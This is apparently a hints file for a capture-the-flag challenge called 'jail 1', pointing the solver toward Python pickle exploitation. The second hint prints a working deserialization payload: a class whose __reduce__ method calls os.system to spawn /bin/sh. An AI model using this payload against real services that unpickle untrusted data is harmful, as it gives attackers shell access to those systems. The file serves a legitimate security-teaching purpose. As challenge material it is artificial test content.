# jail 1

<details>
    <summary>Hint 1</summary>

Try searching "python pickle exploit" on google.

</details>

<details>
    <summary>Hint 2</summary>

    ```py
    import os
    
    class RCE:
        def __reduce__(self):
            return os.system, ('/bin/sh',)
    ```

</details>
